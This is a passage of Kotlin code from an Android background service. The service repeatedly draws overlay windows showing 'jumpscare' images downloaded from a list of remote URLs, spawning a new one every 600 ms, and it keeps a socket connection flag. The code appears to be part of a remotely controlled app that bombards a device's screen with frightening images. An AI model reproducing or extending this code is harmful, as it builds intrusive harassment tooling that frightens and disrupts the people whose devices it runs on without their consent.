                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: android.graphics.Bitmap? = null
                            for (i in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }
}

object SocketHolder {
    var connected: Boolean = false
}